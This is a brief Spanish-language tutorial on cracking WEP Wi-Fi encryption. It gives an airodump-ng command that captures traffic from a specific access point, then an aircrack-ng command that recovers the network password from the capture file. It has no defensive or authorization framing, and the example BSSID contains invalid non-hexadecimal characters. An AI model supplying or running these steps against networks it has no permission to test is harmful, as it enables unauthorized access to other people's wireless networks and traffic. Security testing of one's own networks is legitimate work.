# Descifrar el cifrado WEP

## Pasos para descifrar WEP

Realizar la captura de datos de la red

```
airodump-ng -c 6 --bssid 55:LE:D2:42:23:50 -w crackwep wlan0
```

Los datos capturados estarán en crackwep,ese archivo vamos a usarlo para descifrar la password con el siguiente comando.

```
aircrack-ng crackwep.cap
```

Una vez terminado se obtiene la password.
